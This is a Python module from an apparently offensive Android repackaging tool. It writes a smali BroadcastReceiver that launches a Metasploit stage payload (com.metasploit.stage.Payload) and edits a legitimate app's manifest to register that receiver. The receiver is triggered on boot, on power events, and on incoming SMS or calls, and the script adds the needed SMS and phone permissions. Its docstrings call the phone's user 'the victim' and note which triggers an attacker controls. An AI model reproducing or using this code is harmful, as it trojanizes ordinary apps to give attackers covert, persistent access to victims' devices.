import sys
sys.path.append('../')
from manifestmanager import manifest_changer




#gloab variables

path = ""
#on_power_connected
opc = False
#on_power_disconnected
opdc = False
#on_boot_completed
obc = False
#on_receive_sms
ors = False
#on_incoming_call
oic = False
#on_outgoing_call
ooc = False


def __fix_manifest(manifest_path, package):
    """
    Fixes the AndroidManifest.xml dependent on the specified hooks. Adds neede permissions. Adds needed receiver.

    :return
    pass
    """
    global path,obc,opdc,opc, ors, oic, ooc

    # inject receiver:
    rec = ('        <receiver android:name="' + package.replace("/",".") + '.BroadcastLauncher">\n            <intent-filter>\n').replace("..", ".")
    
    permissions = []
    if opc:
        rec += '                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>\n'
    if opdc:
        rec += '                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>\n'
    if obc:
        rec += '                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n'
        permissions.append("android.permission.RECEIVE_BOOT_COMPLETED")
    if ors:
        rec += '                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>\n'
        permissions.append("android.permission.RECEIVE_SMS")
    if oic:
        rec += '                <action android:name="android.intent.action.PHONE_STATE"/>\n'
        permissions.append("android.permission.READ_PHONE_STATE")
    if ooc:
        rec += '                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>\n'
        permissions.append("android.permission.PROCESS_OUTGOING_CALLS")

    rec += '            </intent-filter>\n        </receiver>'

    manifest_changer.add_receiver(manifest_path, rec)

    # add permissions
    manifest_changer.add_permissions_to_manifest(manifest_path, manifest_path, permissions)

    return
                
    


    pass

def __inject_smali(package):
    global path
    smali = (".class public L" +package + "/BroadcastLauncher;\n").replace("//", "/")
    smali += """.super Landroid/content/BroadcastReceiver;
.source "BroadcastLauncher.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;\n"""

    invoke = "    invoke-static {p1}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
    smali += invoke

    smali += """    .prologue
    .line 12
    return-void
.end method"""

    print(smali)
    
    with open(path+"BroadcastLauncher.smali","w") as f:
        f.write(smali)

    

def inject_broadcast_hook(manifest_path, payload_path, package_path,
                          on_power_connected=False, on_power_disconnected=False, on_boot_completed=False, on_receive_sms=False,
                          on_incoming_call=False, on_outgoing_call=False):
    """
    Injects different hooks into the original application. These hooks are launched on the intents given in the parameters

    :param manifest_path: path to the folder where the AndroidManifest.xml is placed
    :type manifest_path: str

    :param payload_path: path to the folder where the payload is placed
    :type payload_path: str

    :param package_path: package name within the original application(e.g. com/metasploit/stage)
    :type package_path: str

    :param on_power_connected: Inject hook which is launched when the power to the phone is connected
    :type on_power_connected: bool

    :param on_power_disconnected: Inject hook which is launched when the power to the phone is disconnected
    :type on_power_disconnected: bool

    :param on_boot_completed: Inject hook which is launched when the phone finished booting. Note: this hook is rarely launched because most people do not reboot their phone for a long time.
    :type on_boot_completed: bool

    :param on_receive_sms: Inject hook which is launched when SMS is received. This is actually controlable by the attacker!
    :type on_receive_sms: bool

    :param on_incoming_call: Inject hook which is launched when Call is received. This is actually controlable by the attacker!
    :type on_incoming_call: bool

    :param on_outgoing_call: Inject hook which is launched when the victim calls somebody. This is actually controlable by the attacker!
    :type on_outgoing_call: bool

    :return
    pass
    """

    global path,obc,opdc,opc,ors,oic,ooc

    path = payload_path
    opc = on_power_connected
    opdc = on_power_disconnected
    obc = on_boot_completed
    ors = on_receive_sms
    oic = on_incoming_call
    ooc = on_outgoing_call

    __inject_smali(package_path)
    __fix_manifest(manifest_path, package_path)

    

#def main():
#    inject_broadcast_hook("/home/moe/Dokumente/Packadroid/Automated_Repackager/pythonFiles/broadcasthook/AndroidManifest.xml","/com/metasploit/stage/", True, True, True)

#main()